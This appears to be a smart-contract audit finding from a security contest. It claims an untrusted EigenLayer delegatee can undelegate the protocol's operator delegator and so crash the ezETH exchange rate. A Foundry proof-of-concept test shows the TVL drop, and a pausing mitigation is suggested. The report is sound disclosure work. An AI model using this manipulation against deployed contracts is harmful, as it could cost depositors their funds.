# Vulnerability details

## Impact
Per the C4 page of the contest it does not states whether the delegatees (people that operator delegators delegates the funds to) trusted or not. Considering that, delegatees also not stated as a trusted role in the protocol. If the delegatees undelegate themselves from DelegationManager contract in EigenLayer, all the funds will be withdrawn and the ezETH exchange rate will drop drastically. 

## Proof of Concept
This is the function that the delegatee will call to undelegate hisself and withdraw all the funds that is delegated to him. Since the operator delegator delegates to this delegatee all the funds will be withdrawn. Also, since the operator delegator tracks the TVL in eigen layer strategy shares and all the shares are withdrawn the TVL drop will not be expected. 
https://github.com/Layr-Labs/eigenlayer-contracts/blob/98685285e5e504fa6180c010d2835cd506c4ecc6/src/contracts/core/DelegationManager.sol#L211-L258

```solidity
function test_UndelegateManipulatesExchangeRate() external {
        
        // mock a delegatee
        address toDelegate = address(123);
        IDelegationManager.OperatorDetails memory registeringOperatorDetails;
        registeringOperatorDetails.earningsReceiver = toDelegate;
        registeringOperatorDetails.stakerOptOutWindowBlocks = 100;
        vm.prank(toDelegate);
        DELEGATION_MANAGER.registerAsOperator(registeringOperatorDetails, "");

        // delegate to delegatee
        ISignatureUtils.SignatureWithExpiry memory approverSignatureAndExpiry;
        vm.prank(management);
        od1.setDelegateAddress(toDelegate, approverSignatureAndExpiry, "");
                
        // first add some wbeth, 10 wbeth is the buffer and check the TVL
        vm.startPrank(tapir);
        uint amount = 100 * 1e18;
        deal(address(WBETH), tapir, amount);
        WBETH.approve(address(rsm), type(uint256).max);
        rsm.deposit(WBETH, amount);
        (, , uint totalTVLBeforeUndelegate) = rsm.calculateTVLs();
        console2.log("Total TVL before undelegate", totalTVLBeforeUndelegate);
        vm.stopPrank();

        // undelegate
        vm.prank(toDelegate);
        DELEGATION_MANAGER.undelegate(address(od1));

        // check the TVL again
        (, , uint totalTVLAfterUndelegate) = rsm.calculateTVLs();
        console2.log("Total TVL after undelegate", totalTVLAfterUndelegate);

        // TVL indeed dropped
        assertGe(totalTVLBeforeUndelegate, totalTVLAfterUndelegate);
    }
```

## Recommended Mitigation Steps
Acknowledge that the delegatees can undelegate to manipulate exchange rate of ezETH.

This can be done maliciously or maybe it has to be done for some technical reason. In such cases protocol should have some sort of pausing method in order to be safe.
